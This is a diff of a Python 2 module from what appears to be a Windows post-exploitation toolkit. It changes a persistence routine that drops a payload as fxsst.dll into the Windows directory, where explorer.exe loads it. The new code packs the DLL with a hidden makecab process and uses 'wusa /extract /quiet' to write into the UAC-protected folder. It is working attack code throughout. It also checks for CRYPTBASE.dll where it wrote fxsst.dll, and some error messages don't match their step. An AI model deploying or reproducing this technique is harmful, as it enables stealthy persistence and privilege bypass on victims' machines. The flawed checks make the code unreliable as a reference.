@@ -4,53 +4,106 @@ Fixed in: Windows 8
 """
 import os
 import wmi
-import shutil
-import ctypes
-from colorama import init, Fore
-init(convert=True)
+import time
+import tempfile
+from core.prints import *
 
 wmi = wmi.WMI()
 
-dll_name = "fxsst.dll"
-
-def successBox():
-	return (Fore.GREEN + '[+]' + Fore.RESET)
-
-def errorBox():
-	return (Fore.RED + '[-]' + Fore.RESET)
-
-def infoBox():
-	return (Fore.CYAN + '[!]' + Fore.RESET)	
-
-def warningBox():
-	return (Fore.YELLOW + '[!]' + Fore.RESET)
-
 def windows_directory():
 	for os in wmi.Win32_OperatingSystem():
-		return os.WindowsDirectory	
-	
-def fax_dll_hijack():
-	print " {} fax_dll_hijack: Attempting to copy: {} to: {} in order to dll hijack explorer".format(infoBox(),dll_name,windows_directory())
-	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
-		print " {} fax_dll_hijack: We are running as admin, we can proceed".format(infoBox())
-		
-		if (os.path.isfile(os.path.join(windows_directory(),dll_name)) == True):
-			try:
-				os.remove(os.path.join(windows_directory(),dll_name))
-				print " {} fax_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,windows_directory())
-			except Exception as error:
-				print " {} fax_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,windows_directory())
-				return False
+		return os.WindowsDirectory
 
+dll_name = "fxsst.dll"
+
+def fax_dll(payload):
+	print """
+ -------------------------------------------------------------
+ Persistence technique using dll hijacking, once explorer.exe
+ starts it attempts to load fxsst.dll if the DLL is present
+ in the Windows directory. The DLL needs to call LoadLibrary
+ on itself, otherwise explorer.exe will crash.
+ 
+ When everything worked correctly, we should gain persistence
+ -------------------------------------------------------------
+ """
+	"""
+	Save the DLL file to temp directory
+	"""
+	print_info("Payload: {}".format(payload))
+	print_info("Attempting to read payload data")
+	if (os.path.isfile(os.path.join(payload)) == True):
 		try:
-			shutil.copy(dll_name,windows_directory())
-			print " {} fax_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,windows_directory())
-		except shutil.Error as error:
-			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
+			payload_data = open(os.path.join(payload),"rb").read()
+			print_success("Successfully read payload data")
+		except Exception as error:
+			print_error("Unable to read payload data")
 			return False
-		except IOError as error:
-			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
+		
+		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
+		try:
+			dll_file = open(os.path.join(tempfile.gettempdir(),"fxsst.dll"),"wb")
+			dll_file.write(payload_data)
+			dll_file.close()
+			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
+		except Exception as error:
+			print_error("Unable to save payload to disk")
+			return False
+	
+	print_info("Pausing for 5 seconds before creating cabinet file")
+	time.sleep(5)
+
+	"""
+	Create a cabinet file that we can use later for
+	the DLL drop
+	"""
+	print_info("Attempting to create cabinet file")
+	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
+		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"fxsst.dll"),
+							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+		
+		time.sleep(5)
+
+		if (makecab[1] == 0):
+			print_success("Successfully created cabinet file in: {}".format(tempfile.gettempdir()))
+			try:
+				os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
+			except Exception as error:
+				print_error("Unable to create cabinet file")
+				return False
+		else:
+			print_error("Unable to create cabinet file")
 			return False
 	else:
-		print " {} fax_dll_hijack: We are not admin, cannot proceed".format(errorBox())
+		print_error("Unable to create cabinet file, the payload is not present in: {}".format(tempfile.gettempdir()))
+		return False
+	
+	print_info("Pausing for 5 seconds before extracting the cabinet file")
+	time.sleep(5)
+
+	"""
+	We use the built-in feature wusa to extract our DLL file
+	into UAC protected folders, this feature was removed in
+	Windows 10
+	"""
+	print_info("Attempting to extract the cabinet file")
+	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
+		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),windows_directory()),
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+		
+		time.sleep(5)
+
+		if (wusa[1] == 0):
+			print_success("Successfully extracted cabinet file")
+			try:
+				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
+			except Exception as error:
+				print_error("Unable to extract cabinet file")
+				return False
+		else:
+			print_error("Unable to extract cabinet file")
+			return False
+	else:
+		print_error("Unable to extract cabinet file, the cabinet file is not present in: {}".format(tempfile.gettempdir()))
 		return False
